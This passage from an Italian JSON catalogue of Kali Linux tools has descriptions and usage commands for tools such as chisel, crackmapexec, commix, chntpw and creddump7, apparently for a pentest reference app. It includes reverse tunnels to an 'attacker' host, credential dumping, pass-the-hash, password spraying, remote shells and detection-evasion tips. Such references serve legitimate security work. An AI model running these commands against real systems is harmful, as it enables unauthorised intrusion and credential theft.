class=\"rt-amber\">Casi d'uso</h4><p>In <strong>AD Pentesting</strong>, AD CS è spesso trascurato ma offre path di escalation devastanti. ESC1 (SAN manipulation) è comune e permette di impersonare qualsiasi utente. Per <strong>Persistence</strong>, i certificati durano tipicamente 1 anno e bypassano il reset password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste certificato sono loggate sulla CA. Alert su template sensibili o SAN inusuali sono possibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "cewl",
    "name": "cewl",
    "version": "6.2.1",
    "icon": "../app/icons/cewl-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cewl/",
    "desc": "Genera wordlist custom crawlando siti web ed estraendo parole uniche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CeWL (Custom Word List generator) crea wordlist personalizzate analizzando il contenuto di un sito web target. Crawla le pagine estraendo parole uniche che vengono poi usate per attacchi di password cracking. Le password aziendali spesso contengono termini specifici del business (nomi prodotti, slogan, termini tecnici) che CeWL cattura automaticamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling:</strong> Spider il sito fino a una profondità configurabile, seguendo link interni.</p><p><strong>Word Extraction:</strong> Estrae parole con lunghezza minima configurabile, rimuovendo duplicati.</p><p><strong>Email Extraction:</strong> Può estrarre anche indirizzi email trovati nelle pagine.</p><p><strong>Metadata:</strong> Opzionalmente estrae metadati da documenti (PDF, DOC) linkati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl base con output su file\ncewl -w wordlist.txt https://target.com\n\n# Con profondità e lunghezza minima\ncewl -d 3 -m 6 -w words.txt https://target.com\n\n# Estrazione email inclusa\ncewl -e -w words.txt --email_file emails.txt https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima di attacchi <strong>Password Cracking</strong>, crea wordlist mirate che aumentano la probabilità di successo. Per <strong>Targeted Attacks</strong>, le password spesso contengono nomi aziendali o di prodotti. Combinare con regole hashcat per mutazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il crawling genera traffico HTTP. Rate limiting può rivelare l'attività. Usare user agent rotation.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "chainsaw",
    "name": "chainsaw",
    "version": "2.12.2",
    "icon": "../app/icons/chainsaw-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chainsaw/",
    "desc": "Analizza rapidamente log Windows (EVTX) con regole Sigma e hunting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chainsaw è uno strumento di triage forense per log Windows Event Log (EVTX). Scritto in Rust per massima velocità, può processare gigabyte di log in secondi cercando indicatori di compromissione usando regole Sigma, detection logic custom o keyword search. È progettato per gli incident responder che hanno bisogno di risposte rapide.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Sigma Integration:</strong> Applica migliaia di regole Sigma per rilevare tecniche di attacco note (lateral movement, persistence, credential access).</p><p><strong>Hunt Mode:</strong> Cerca pattern sospetti predefiniti (PowerShell encoded, service creation, scheduled tasks).</p><p><strong>Search:</strong> Ricerca full-text e regex attraverso tutti i campi degli eventi.</p><p><strong>Timeline:</strong> Genera timeline degli eventi per ricostruire la sequenza dell'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Hunt con regole Sigma\nchainsaw hunt /path/to/evtx/ -s sigma/ --mapping sigma-mapping.yml\n\n# Ricerca keyword specifica\nchainsaw search -t 'mimikatz' /path/to/evtx/\n\n# Analisi con output JSON\nchainsaw hunt /path/to/evtx/ -s sigma/ -o results.json --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Incident Response</strong>, fornisce triage immediato dei log per identificare l'attacco. Per <strong>Threat Hunting</strong>, cerca proattivamente indicatori di compromissione. Durante <strong>Forensics</strong>, ricostruisce la timeline dell'intrusione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Red Team:</strong> Conoscere chainsaw aiuta a capire cosa cercare e come evitare detection nei log.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "chisel-kali",
    "name": "chisel",
    "version": "1.10.1",
    "icon": "../app/icons/chisel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chisel/",
    "desc": "Tunnel TCP/UDP veloce over HTTP, perfetto per pivoting in ambienti restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chisel è un tunnel TCP/UDP velocissimo che opera over HTTP/HTTPS, progettato per bypassare firewall restrittivi. Un singolo binario Go cross-platform implementa sia il client che il server, supportando forward e reverse tunneling. È lo strumento preferito per il pivoting durante penetration test quando le connessioni dirette sono bloccate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Tunneling:</strong> Incapsula il traffico TCP/UDP in HTTP, passando attraverso proxy e WAF.</p><p><strong>Reverse Tunneling:</strong> Il client interno si connette al server esterno, bypassando NAT e firewall.</p><p><strong>Port Forwarding:</strong> Forward locale, remoto e SOCKS proxy tutti in un tool.</p><p><strong>Encryption:</strong> Tutto il traffico è cifrato, apparendo come normale HTTPS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (attacker)\nchisel server -p 8080 --reverse\n\n# Client reverse tunnel (vittima)\nchisel client attacker:8080 R:9050:socks\n\n# Forward tunnel locale\nchisel client attacker:8080 1080:socks\n\n# Tunnel specifico\nchisel client attacker:8080 R:3389:10.0.0.5:3389</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pivoting</strong> in reti segmentate, crea tunnel SOCKS per raggiungere subnet interne. In ambienti con <strong>Egress Filtering</strong> restrittivo dove solo HTTP/HTTPS escono. Per <strong>Post-Exploitation</strong>, porta accesso RDP/SSH attraverso firewall.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il pattern di traffico WebSocket può essere riconosciuto. Usare --socks5 per proxy chain. Il binario su disco è un artefatto.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "chntpw",
    "name": "chntpw",
    "version": "140201",
    "icon": "../app/icons/chntpw-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chntpw/",
    "desc": "Resetta o modifica password Windows NT/2000/XP/Vista/7 dal file SAM offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chntpw (Change NT Password) è uno strumento per manipolare il registro Windows e il database SAM offline. Permette di resettare o modificare password di account locali, abilitare/disabilitare account e modificare la membership di gruppi senza conoscere la password originale. Richiede accesso fisico o boot da media esterno (es. Kali Live).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Reset:</strong> Azzera la password di qualsiasi account locale, permettendo login senza password.</p><p><strong>Account Management:</strong> Abilita account disabilitati (incluso l'Administrator nascosto), modifica flag account.</p><p><strong>Group Membership:</strong> Aggiunge utenti a gruppi privilegiati (Administrators) modificando il SAM.</p><p><strong>Registry Editing:</strong> Editor generico per file registry Windows (SAM, SYSTEM, SOFTWARE).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Boot da Kali Live, montare partizione Windows\nmount /dev/sda2 /mnt/windows\n\n# Reset password interattivo\nchntpw -i /mnt/windows/Windows/System32/config/SAM\n\n# Reset diretto utente specifico\nchntpw -u Administrator /mnt/windows/Windows/System32/config/SAM</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Physical Pentesting</strong>, quando si ha accesso fisico a un PC, chntpw bypassa l'autenticazione locale. Per <strong>Recovery</strong>, quando un amministratore dimentica la password. In <strong>Forensics</strong>, abilita account per esaminare il sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Non funziona con account Microsoft/Azure AD. BitLocker blocca l'accesso offline. Modifica artefatti forensi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "cloud-enum",
    "name": "cloud-enum",
    "version": "0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cloud-enum/",
    "desc": "Enumera risorse cloud pubbliche (S3, Azure blobs, GCP buckets) di un target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cloud_enum automatizza la discovery di risorse cloud pubblicamente accessibili appartenenti a un'organizzazione target. Cerca bucket S3, container Azure Blob Storage e Google Cloud Storage usando permutazioni del nome aziendale, identificando risorse mal configurate che espongono dati sensibili. È un tool essenziale per l'External Attack Surface Management.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Cloud:</strong> Supporta AWS S3, Azure Blob, Google Cloud Storage in un unico scan.</p><p><strong>Permutation Engine:</strong> Genera variazioni del nome target (company-backup, company-dev, company-prod) per massimizzare la copertura.</p><p><strong>Access Verification:</strong> Verifica quali risorse trovate sono effettivamente accessibili pubblicamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione base\ncloud_enum -k companyname\n\n# Con wordlist custom\ncloud_enum -k companyname -m mutations.txt\n\n# Solo specifici provider\ncloud_enum -k companyname --disable-azure --disable-gcp</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, trova storage cloud esposti che potrebbero contenere backup, log, codice sorgente o dati clienti. Per <strong>Bug Bounty</strong>, i bucket mal configurati sono finding comuni e remunerativi. In <strong>Compliance Audit</strong>, verifica che l'organizzazione non esponga dati accidentalmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Enumerare è legale, ma accedere a dati non autorizzati non lo è. Documentare sempre i finding senza scaricare contenuti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "cloudbrute",
    "name": "cloudbrute",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cloudbrute/",
    "desc": "Trova storage cloud mal configurati tramite brute force di nomi comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CloudBrute è un tool scritto in Go per la discovery di risorse cloud tramite brute force. Più veloce delle alternative Python, enumera bucket S3, Azure Storage e GCP testando migliaia di nomi al secondo. Include wordlist ottimizzate per pattern comuni nel naming di risorse cloud (backup, logs, dev, staging).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> Scritto in Go con goroutine per massimo parallelismo.</p><p><strong>Multi-Provider:</strong> AWS, Azure, GCP e DigitalOcean Spaces supportati.</p><p><strong>Smart Wordlists:</strong> Include liste specifiche per cloud resources naming conventions.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force con keyword\ncloudbrute -d target.com -k target -w wordlist.txt\n\n# Solo AWS con output\ncloudbrute -d target.com -k target -p aws -o results.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Simile a cloud_enum ma più veloce per scan massivi. Per <strong>Large Scale Reconnaissance</strong> su molti target. In <strong>Automated Pipelines</strong> dove la velocità è critica.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Il volume di richieste può triggerare rate limiting o ban. Distribuire le richieste nel tempo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "cmseek",
    "name": "cmseek",
    "version": "1.1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cmseek/",
    "desc": "Rileva CMS (WordPress, Joomla, Drupal) e cerca vulnerabilità associate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CMSeek (CMS Detection and Exploitation Suite) identifica il Content Management System utilizzato da un sito web e ne enumera la versione, i plugin e i temi installati. Supporta oltre 180 CMS diversi (WordPress, Joomla, Drupal, Magento, ecc.) e può cercare vulnerabilità note nelle versioni identificate, suggerendo exploit disponibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CMS Detection:</strong> Identifica il CMS tramite header, meta tag, file specifici e pattern nel codice.</p><p><strong>Version Detection:</strong> Determina la versione esatta per correlare con CVE note.</p><p><strong>Plugin Enumeration:</strong> Per WordPress, enumera plugin e temi installati cercando vulnerabilità.</p><p><strong>Vulnerability Lookup:</strong> Cerca CVE e exploit pubblici per le versioni trovate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione singolo target\ncmseek -u https://target.com\n\n# Scansione multipli target da file\ncmseek -l targets.txt\n\n# Solo detection senza vulnerability scan\ncmseek -u https://target.com --no-redirect</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Reconnaissance</strong> web, identifica rapidamente la tecnologia per orientare i test successivi. Per <strong>Vulnerability Assessment</strong>, correla versioni con CVE note. In <strong>Bug Bounty</strong>, i CMS sono target frequenti per vulnerabilità note in plugin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Genera traffico HTTP riconoscibile. Plugin enumeration può triggerare WAF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "commix",
    "name": "commix",
    "version": "4.0",
    "icon": "../app/icons/commix-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/commix/",
    "desc": "Automatizza test e sfruttamento di command injection su applicazioni web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Commix (Command Injection Exploiter) è uno strumento automatizzato per la detection e lo sfruttamento di vulnerabilità di OS command injection nelle applicazioni web. Testa sistematicamente diversi vettori e tecniche di injection (classic, eval-based, time-based blind) e, una volta trovata la vulnerabilità, può stabilire una shell interattiva per il post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Techniques:</strong> Classic injection (;, |, &&), eval-based, time-based blind, file-based.</p><p><strong>Shell Access:</strong> Una volta confermata l'injection, fornisce pseudo-shell interattiva per eseguire comandi.</p><p><strong>Reverse Shell:</strong> Può stabilire reverse shell diretta verso l'attaccante.</p><p><strong>WAF Bypass:</strong> Include tecniche di evasione e encoding per bypassare filtri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test parametro specifico\ncommix -u \"http://target.com/page.php?cmd=whoami\" --level=3\n\n# Con data POST\ncommix -u \"http://target.com/page.php\" --data=\"cmd=test\" --level=3\n\n# Shell pseudo-terminale\ncommix -u \"http://target.com/page.php?cmd=id\" --os-shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Pentesting</strong>, quando si sospetta command injection (form che interagiscono con il sistema, ping utilities, PDF generators). Per <strong>Exploitation</strong> rapido di injection trovate manualmente. Come SQLmap ma per OS command injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> I payload di injection sono riconoscibili da WAF. Time-based blind genera molte richieste.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "Command_Injection"
    ],
    "notes": null
  },
  {
    "id": "cowpatty",
    "name": "cowpatty",
    "version": "4.8",
    "icon": "../app/icons/cowpatty-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cowpatty/",
    "desc": "Cracca WPA/WPA2-PSK usando dizionari o rainbow table precomputate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>coWPAtty è uno strumento per il cracking offline di password WPA/WPA2-PSK. A differenza di aircrack-ng che calcola le chiavi al volo, coWPAtty può utilizzare rainbow table precomputate (PMK - Pairwise Master Key) che velocizzano drasticamente l'attacco se sono disponibili per l'SSID target. Richiede un handshake catturato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Attacco classico con wordlist, calcolando PMK per ogni password tentata.</p><p><strong>Rainbow Table:</strong> Utilizza hash precomputati per SSID specifici, riducendo il tempo di crack a secondi.</p><p><strong>Table Generation:</strong> Include genpmk per creare rainbow table personalizzate per SSID target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Attacco dizionario\ncowpatty -r capture.cap -f wordlist.txt -s TargetSSID\n\n# Con rainbow table precomputata\ncowpatty -r capture.cap -d rainbow_table.cow -s TargetSSID\n\n# Generazione rainbow table\ngenpmk -f wordlist.txt -d output.cow -s TargetSSID</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, le rainbow table accelerano enormemente il cracking per SSID comuni (\"linksys\", \"NETGEAR\"). Per <strong>Enterprise</strong>, creare table per l'SSID aziendale permette di testare la robustezza delle password rapidamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Le rainbow table sono specifiche per SSID. SSID unici richiedono generazione custom che può richiedere tempo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "crackle",
    "name": "crackle",
    "version": "0.1~git01282014",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crackle/",
    "desc": "Cracca pairing BLE (Bluetooth Low Energy) e decripta traffico catturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Crackle sfrutta una vulnerabilità nel processo di pairing Bluetooth Low Energy (BLE) per recuperare la chiave di cifratura e decrittare il traffico catturato. Il pairing BLE Legacy usa una Temporary Key (TK) a 6 cifre che può essere bruteforzata in meno di un secondo, permettendo di decifrare tutto il traffico successivo tra i dispositivi paired.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TK Cracking:</strong> Bruteforce della Temporary Key a 6 cifre usata nel Legacy Pairing BLE (1 milione di combinazioni).</p><p><strong>STK/LTK Recovery:</strong> Dalla TK, deriva Short Term Key e Long Term Key per decifrare sessioni correnti e future.</p><p><strong>Traffic Decryption:</strong> Decripta il traffico BLE catturato in formato pcap.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crack da cattura pcap con pairing\ncrackle -i capture.pcap -o decrypted.pcap\n\n# Con TK nota\ncrackle -i capture.pcap -o decrypted.pcap -t 123456</code></pre><p>Richiede la cattura del processo di pairing completo (LE Pairing Request/Response e Pairing Confirm).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>IoT Security</strong>, testa la sicurezza del pairing di dispositivi smart (fitness tracker, smartwatch, serrature). Per <strong>Research</strong>, analizza protocolli proprietari over BLE dopo aver decifrato il traffico. Dimostra le debolezze del Legacy Pairing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> BLE Secure Connections (pairing moderno) usa ECDH e non è vulnerabile. Richiede cattura del pairing iniziale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "crackmapexec",
    "name": "crackmapexec",
    "version": "5.4.0",
    "icon": "../app/icons/crackmapexec-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crackmapexec/",
    "desc": "Post-exploitation tool per reti Windows: SMB, WMI, MSSQL, LDAP, spray, relay.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (CME) è il coltellino svizzero per il post-exploitation in ambienti Windows/Active Directory. Un singolo tool che supporta SMB, WinRM, LDAP, MSSQL, SSH e RDP per enumerazione, password spraying, esecuzione remota e lateral movement. È lo strumento preferito per 'owned one, pwn them all' - partendo da una credenziale, compromettere l'intera rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Spraying:</strong> Testa credenziali contro molti host simultaneamente identificando dove sono valide.</p><p><strong>Credential Dumping:</strong> Estrae hash SAM, LSA secrets e credenziali cached via SMB/WMI.</p><p><strong>Remote Execution:</strong> Esegue comandi remoti via WMI, SMBExec, PSExec, WinRM senza lasciare file.</p><p><strong>Module System:</strong> Centinaia di moduli per task specifici (Mimikatz, BloodHound collection, GPP passwords).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Password spray evitando lockout (1 password per ciclo)\ncrackmapexec smb targets.txt -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success\n\n# Pass-the-hash su intera subnet\ncrackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435:31d6cfe0d16ae931' --local-auth\n\n# Dump credenziali completo (SAM + LSA + NTDS se DC)\ncrackmapexec smb dc01.domain.local -u admin -p pass --sam --lsa --ntds\n\n# Esecuzione fileless con output\ncrackmapexec smb 192.168.1.10 -u admin -p pass -X 'Get-Process | Select Name,Id'\n\n# Module chaining: enum -&gt; exploit\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M spider_plus  # cerca file sensibili\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M gpp_password  # GPP creds\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass -M lsassy  # dump remoto\n\n# LDAP per BloodHound collection\ncrackmapexec ldap dc01 -u user -p pass -M bloodhound --collection All\n\n# MSSQL per command execution via xp_cmdshell\ncrackmapexec mssql sql01 -u sa -p 'Password123!' -x 'whoami'\n\n# WinRM per sessione interattiva\ncrackmapexec winrm 192.168.1.10 -u admin -p pass -X '$env:COMPUTERNAME'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>essenziale</strong> in ogni AD pentest. Password spraying identifica credenziali riutilizzate. Lateral movement massivo con credenziali compromesse. L'output colorato mostra immediatamente dove le credenziali funzionano (Pwn3d!).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le tecniche sono note e monitorate. Password spray genera login falliti. L'uso dei moduli (Mimikatz) triggera EDR.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "creddump7",
    "name": "creddump7",
    "version": "0.1",
    "icon": "../app/icons/creddump7-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/creddump7/",
    "desc": "Estrae hash e credenziali cached da registry hive Windows (SAM, SYSTEM).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Creddump7 è un insieme di script Python per estrarre credenziali da file registry Windows (SAM, SYSTEM, SECURITY) ottenuti offline. Recupera hash NTLM degli account locali, LSA secrets (password servizi, auto-logon) e domain cached credentials (DCC/MSCache) che possono essere craccate offline per ottenere password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>pwdump:</strong> Estrae hash NTLM dal file SAM per tutti gli account locali.</p><p><strong>cachedump:</strong> Estrae Domain Cached Credentials dal file SECURITY per utenti di dominio che hanno fatto login.</p><p><strong>lsadump:</strong> Estrae LSA Secrets contenenti password di servizi, VPN e altri segreti memorizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump hash locali (richiede SAM e SYSTEM)\npwdump.py /mnt/windows/System32/config/SYSTEM /mnt/windows/System32/config/SAM\n\n# Dump cached credentials (richiede SYSTEM e SECURITY)\ncachedump.py /mnt/windows/System32/config/SYSTEM /mnt/windows/System32/config/SECURITY\n\n# Dump LSA secrets\nlsadump.py /mnt/windows/System32/config/SYSTEM /mnt/windows/System32/config/SECURITY</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Offline Analysis</strong>, quando si hanno copie dei registry hive (backup, immagine forense, shadow copies). Per <strong>Forensics</strong>, estrae credenziali da sistemi compromessi. Quando accesso live non è possibile ma si hanno i file.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti:</strong> Richiede accesso ai file registry. Su sistema live, copiare da shadow copies o usare tool come secretsdump.py.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "crowbar",
    "name": "crowbar",
    "version": "4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crowbar/",
    "desc": "Brute forcer per SSH, RDP, VNC, OpenVPN che supporta chiavi e password.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Crowbar (precedentemente Levye) è un tool di brute force specializzato per protocolli che altri cracker non supportano bene. La sua caratteristica distintiva è il supporto per l'autenticazione con chiave SSH (non solo password) e l'attacco a RDP con NLA (Network Level Authentication). Supporta anche VNC e OpenVPN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SSH Key Brute Force:</strong> Testa chiavi private SSH rubate contro molti host per trovare dove funzionano.</p><p><strong>RDP NLA Support:</strong> Attacca Remote Desktop con Network Level Authentication, non supportato da Hydra.</p><p><strong>OpenVPN:</strong> Brute force di credenziali OpenVPN tramite file di configurazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force SSH con chiavi\ncrowbar -b sshkey -s 192.168.1.0/24 -u root -k /path/to/keys/\n\n# Brute force RDP\ncrowbar -b rdp -s 192.168.1.10 -u admin -C passwords.txt\n\n# VPN attack\ncrowbar -b openvpn -s 192.168.1.10 -c vpn.conf -u user -C pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando si trovano <strong>chiavi SSH</strong> su un sistema compromesso, Crowbar testa rapidamente dove funzionano nella rete. Per <strong>RDP Brute Force</strong> moderno con NLA abilitato. In ambienti con <strong>OpenVPN</strong>, testa credenziali rubate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Come ogni brute forcer, genera molti tentativi di login falliti. Account lockout è possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "crunch",
    "name": "crunch",
    "version": "3.6",
    "icon": "../app/icons/crunch-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/crunch/",
    "desc": "Genera wordlist con pattern, charset e lunghezze personalizzabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Crunch è un generatore di wordlist altamente configurabile che crea combinazioni di caratteri basate su pattern, charset e lunghezza specificati. A differenza di tool che usano wordlist esistenti, Crunch genera tutte le possibili combinazioni, permettendo attacchi brute force esaustivi o targetizzati con pattern conosciuti (es. password che iniziano con lettere e finiscono con numeri).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Length Range:</strong> Genera parole da una lunghezza minima a massima specificata.</p><p><strong>Charset Control:</strong> Usa charset predefiniti (alpha, numeric, symbols) o completamente personalizzati.</p><p><strong>Pattern Mode:</strong> Specifica pattern con placeholder (@ per lowercase, , per uppercase, % per numeri, ^ per simboli).</p><p><strong>Streaming:</strong> Può fare pipe diretto a tool di cracking senza salvare su disco (risparmio spazio).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pattern corporate: Nome + Anno + Simbolo\ncrunch 10 12 -t @@@@@@20%%^  # es: Summer2024!\n\n# WiFi: 8 cifre numeriche (PIN WPS o password)\ncrunch 8 8 0123456789 | aircrack-ng -w - capture.cap\n\n# Pipe diretta a hashcat (no file intermedio)\ncrunch 8 8 -t @@@@%%%% | hashcat -m 1000 hashes.txt\n\n# Charset ridotto basato su policy aziendale\ncrunch 8 12 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#' -o policy_wordlist.txt\n\n# Pattern con parola fissa + variazioni\ncrunch 10 10 -t Company%%^^ -o company_variations.txt\n\n# Limita output file per dimensione (split)\ncrunch 6 6 -b 100mb -o START passwords.txt\n\n# Combina con regole esterne\ncrunch 4 4 0123456789 | hashcat --stdout -r best64.rule &gt; mutations.txt\n\n# Resume da checkpoint\ncrunch 8 8 -s startword -e endword</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Targeted Attacks</strong> quando si conosce parzialmente la struttura della password (es. iniziali del nome + anno). In <strong>CTF</strong>, genera tutte le combinazioni di un charset limitato. Per <strong>Policy Testing</strong>, verifica che password rispettino requisiti minimi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dimensioni:</strong> Wordlist esaustive possono essere enormi (terabyte). Usare pattern o pipe streaming per limitare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
